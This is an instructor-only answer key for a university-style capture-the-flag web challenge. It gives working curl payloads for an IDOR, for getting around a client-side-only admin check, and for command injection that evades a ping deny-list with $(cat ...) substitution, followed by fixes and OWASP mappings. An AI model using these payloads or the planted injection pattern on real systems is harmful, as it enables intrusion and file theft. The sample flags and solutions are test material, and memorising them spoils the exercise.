# CTF 8 -- Solutions

> **Instructors/markers only.** Do not distribute to participants.

---

## Credentials

See `src/data/users.json` for all usernames and passwords. The three seeded player accounts are `abcd12`, `efgh34`, and `ijkl56`. Player passwords are random hex strings (re-rolled each time `chgen_ctf8.js` runs). Staff accounts (`sarah.lin`, `tom.ashworth`, `priya.kapoor`, `marcus.webb`) carry the literal password `SYSTEM_INTERNAL` and cannot authenticate.

To regenerate:
```bash
cd CTFs/challenge-generation
node chgen_ctf8.js abcd12 efgh34 ijkl56
```

---

## Flag Locations

| Flag | Location | Delivered via |
|------|----------|---------------|
| 1 | `src/data/flags.json` (server-side substitution into article 3) | IDOR on `/api/articles/:id` |
| 2 | `src/data/flags.json` (embedded in admin dashboard JSON response) | Direct API call to `/api/admin/dashboard` |
| 3 | `src/data/flag-files/flag3-<user>.txt` (copied to `/app/flags/` at startup) | Command substitution inside ping argument |

Flag format: `durham-gzflag{1,2,3}{<16-hex-token>_<username>}`

Example for `abcd12`:
- Flag 1: `durham-gzflag1{15d4f4c31e2c8c80_abcd12}`
- Flag 2: `durham-gzflag2{2185b7f06f9c6295_abcd12}`
- Flag 3: `durham-gzflag3{73bfbc5faeb3159e_abcd12}`

---

## Vulnerability Summary

### Flag 1 -- IDOR (`GET /api/articles/:id`)

The article API looks up articles by integer ID with no check that the requesting user is the author. Because IDs are sequential (1..9) and the UI only shows the player their own articles, they must enumerate foreign IDs to find Sarah Lin's investigative draft (article 3). The server renders `{{PLAYER_FLAG1}}` into the article body at response time using the viewer's username, so each player retrieves their own personal flag.

### Flag 2 -- Missing Server-Side Authorisation (`/api/admin/dashboard`)

The `/admin` HTML page ships `static/js/admin.js`, which calls `/api/me`, reads the role, and redirects non-admins to `/dashboard?error=admin_required`. This is a client-side control. The server-side handler `AdminDeps.APIDashboard` applies only `RequireSession` middleware -- any authenticated session receives the response, which includes the player's flag2 and the full user directory (revealing `marcus.webb` and the maintenance tools list).

### Flag 3 -- Command Injection via Substitution Bypass (`POST /api/admin/health`)

The "Network Diagnostics" tool runs:

```go
cmd := exec.CommandContext(ctx, "sh", "-c", fmt.Sprintf("ping -c 1 -W 2 %s", host))
```

The host field is filtered with a naive deny-list of `;`, `|`, `&`, `\n`, `\r`. None of `$`, `(`, `)`, or backtick are blocked, so `$(cmd)` command substitution is reachable. The payload `$(cat /app/flags/flag3-<user>.txt)` expands before ping runs: the single-token flag is spliced as ping's hostname argument, and because the token isn't resolvable, ping errors with `ping: <flag>: Name does not resolve`, echoing the flag verbatim into `stdout/stderr` which the handler returns to the client.

---

## Full Exploit Walkthrough

### Step 0: Start the application and log in

```bash
cd CTFs/challenge-generation && node chgen_ctf8.js abcd12 efgh34 ijkl56
cd ../CTF_8_gazette && docker compose up --build
```

Either log in at http://localhost:3002 in a browser, or log in via curl and save the session cookie for the command-line walkthrough below. The password for `abcd12` is printed by `chgen_ctf8.js` and also stored in `src/data/users.json`.

```bash
# Capture the abcd12 password from users.json
PASS=$(grep -A1 '"abcd12"' src/data/users.json | grep password | awk -F'"' '{print $4}')

# Log in and save the pressroom_session cookie
curl -sS -c cookies.txt -X POST http://localhost:3002/login \
  -d "username=abcd12&password=$PASS" \
  -o /dev/null --max-redirs 0
```

A successful login returns HTTP 302; the `-c cookies.txt` writes the `pressroom_session` cookie for the next requests. If subsequent calls return `{"error":"authentication required"}`, the cookie jar is empty -- repeat this step before continuing.

---

### Step 1: Flag 1 via IDOR

On the dashboard, the player sees only their own drafts. A breadcrumb TODO in the dashboard HTML source hints at per-user filtering, and an article summary references "articles 7 to 10" -- implying lower IDs exist and are not yours.

**Payload:**

```bash
curl -sS -b cookies.txt http://localhost:3002/api/articles/3
```

**Response body contains:**

```
DRAFT: The tips that won't stop coming
... the confidential marker for this draft is: durham-gzflag1{15d4f4c31e2c8c80_abcd12} ...
```

The same article, viewed by a different logged-in player, returns that player's own flag1. The server substitutes `{{PLAYER_FLAG1}}` from the FlagStore using the session's username.

The draft body also breadcrumbs Flag 2: *"I have asked Marcus's replacement to lock down the admin panel at /admin, but I suspect the API endpoints are still wide open."*

---

### Step 2: Flag 2 via Missing Server-Side Auth

Visiting `http://localhost:3002/admin` in a browser flashes the dashboard then redirects to `/dashboard?error=admin_required`. The redirect is driven entirely by `static/js/admin.js`:

```js
const me = await (await fetch('/api/me')).json();
if (me.role !== 'admin') { window.location = '/dashboard?error=admin_required'; return; }
const data = await (await fetch('/api/admin/dashboard')).json();
```

Calling the API directly bypasses the guard:

```bash
curl -sS -b cookies.txt http://localhost:3002/api/admin/dashboard
```

The response contains:

- `flag`: `durham-gzflag2{...}`
- `maintenance_tools[]` including Marcus Webb's "Network Diagnostics" entry pointing at `/api/admin/health` with an example body `{"host": "example.com"}`
- The full user directory including `marcus.webb` (active=false), confirming the redundancy narrative

The `maintenance_tools` entry is the breadcrumb to Flag 3.

---

### Step 3: Flag 3 via Command Substitution

First, confirm the blocklist rejects obvious injection:

```bash
curl -sS -b cookies.txt -X POST http://localhost:3002/api/admin/health \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1;ls"}'
# => 400 {"error":"Invalid host: forbidden characters detected"}
```

The block list lives in `internal/services/health.go`:
```go
var blockedChars = []string{";", "|", "&", "\n", "\r"}
```

No `$`, `(`, `)`, or backtick. Use command substitution:

```bash
curl -sS -b cookies.txt -X POST http://localhost:3002/api/admin/health \
  -H "Content-Type: application/json" \
  -d '{"host":"$(echo pressroom_bypass_marker)"}'
# => ping: pressroom_bypass_marker: Name does not resolve
```

Bypass confirmed. Read the flag file:

```bash
curl -sS -b cookies.txt -X POST http://localhost:3002/api/admin/health \
  -H "Content-Type: application/json" \
  -d '{"host":"$(cat /app/flags/flag3-abcd12.txt)"}'
```

**Response:**

```json
{
  "host": "$(cat /app/flags/flag3-abcd12.txt)",
  "output": "ping: durham-gzflag3{73bfbc5faeb3159e_abcd12}: Name does not resolve\n",
  "error": "exit status 2"
}
```

The flag is echoed directly in ping's error output.

**Finding the path:** the filename pattern `flag3-<username>.txt` is guessable from the staff convention in article 2 (where Sarah references "flag files"). The path `/app/flags/` is the `FLAGS_DIR` environment variable set in the Dockerfile and exposed in the admin dashboard's `system.notes` breadcrumb. A player can also enumerate: `$(ls /app/flags)` returns the directory listing which is spliced as ping's first argument.

---

## One-liner Verification

```bash
PASS=$(grep abcd12 src/data/users.json | head -1 | awk -F'"' '{print $4}')
COOKIE=$(mktemp)
curl -sS -c $COOKIE -X POST http://localhost:3002/login -d "username=abcd12&password=$PASS" -o /dev/null --max-redirs 0

echo "Flag 1:"
curl -sS -b $COOKIE http://localhost:3002/api/articles/3 | grep -oE 'durham-gzflag1\{[^}]+\}'

echo "Flag 2:"
curl -sS -b $COOKIE http://localhost:3002/api/admin/dashboard | grep -oE 'durham-gzflag2\{[^}]+\}'

echo "Flag 3:"
curl -sS -b $COOKIE -X POST http://localhost:3002/api/admin/health \
  -H "Content-Type: application/json" \
  -d '{"host":"$(cat /app/flags/flag3-abcd12.txt)"}' | grep -oE 'durham-gzflag3\{[^}]+\}'
```

---

## Unintended Solutions to Watch For

- **Cross-user flag read via path manipulation.** The Flag 3 payload specifies the flag file path explicitly. A player could read another player's flag by changing the username in the path (`$(cat /app/flags/flag3-efgh34.txt)`). This is accepted as a documented CTF limitation; each player must still craft the substitution payload to succeed, so the learning objective is preserved.
- **Users.json via path traversal.** The flag-3 payload is `$(cat ...)` with arbitrary file reads inside the container. A determined player could read `/app/src/data/users.json` and harvest other players' bcrypt hashes. The hashes are salted bcrypt, so this is a theoretical risk only; it doesn't shortcut any flag.
- **Browsing `/admin` without bypassing JS.** A player with JavaScript disabled will see the empty admin shell and stop. This is not a valid flag path -- the expected route is via `curl` / DevTools Network tab.
- **Brute-force login.** Rate limited to 5 attempts per 2-minute sliding window per IP by `middleware.NewLoginRateLimiter`.

---

## Defence Recommendations

1. **Enforce server-side ownership on `/api/articles/:id`.** Before returning an article, check `article.author_id == session.user_id` or check an explicit share list. Client-side filtering is not access control.
2. **Enforce server-side role checks on every `/api/admin/*` route.** Add a `RequireRole("admin")` middleware and apply it to the admin route group. The client-side redirect in `admin.js` is a UX hint, not a security boundary.
3. **Replace the command-injection-prone ping shellout.** Either call a pure-Go ICMP library (requires `CAP_NET_RAW`), or `exec.Command("ping", "-c", "1", "-W", "2", host)` directly without `sh -c`, and validate `host` against a strict allow-list (RFC 1123 hostname or a parsed `net.IP`).
4. **Stop using deny-lists for input validation.** Deny-lists are brittle; allow-lists are safer. For `host`, enforce `^[a-zA-Z0-9.-]+$` with a length cap, and ensure the total doesn't start with `-` (another ping footgun).
5. **Use non-sequential article IDs.** UUIDs or ULIDs make enumeration harder, but they do not fix the underlying access-control bug.
6. **Drop the binary's permission surface.** Run the container as a non-root user; strip `CAP_NET_RAW` if ICMP is unavailable anyway.

---

## OWASP Classification

| Technique | OWASP Category | Justification |
|-----------|----------------|---------------|
| IDOR on sequential article IDs | A01:2021 Broken Access Control | Missing ownership check lets any authenticated user read any article |
| Missing server-side authorisation on admin API | A01:2021 Broken Access Control | Role check performed only on the client, server trusts any valid session |
| OS command injection via `$(...)` bypass | A03:2021 Injection | Unvalidated user input interpolated into `sh -c` with an incomplete deny-list |

---

## Skill Level Summary

| Step | What the student does | Skill required |
|------|-----------------------|----------------|
| 1 | Log in, read dashboard breadcrumbs | Beginner |
| 2 | Enumerate `/api/articles/<n>` for foreign IDs | Beginner |
| 3 | Realise admin-panel redirect is client-side only; replay `/api/admin/dashboard` via curl or DevTools | Intermediate |
| 4 | Read the admin maintenance_tools hint pointing at `/api/admin/health` | Beginner |
| 5 | Discover the blocklist via trial and construct a `$(...)` bypass | Intermediate |
| 6 | Locate the flag file path (`/app/flags/flag3-<user>.txt`) and craft the `cat` payload | Intermediate |

---

## Reset

```bash
docker compose down && docker compose up --build
```

This destroys the container and rebuilds. Flag files are baked into the image at build time and also mounted read-only, so there is no persistent state to wipe.
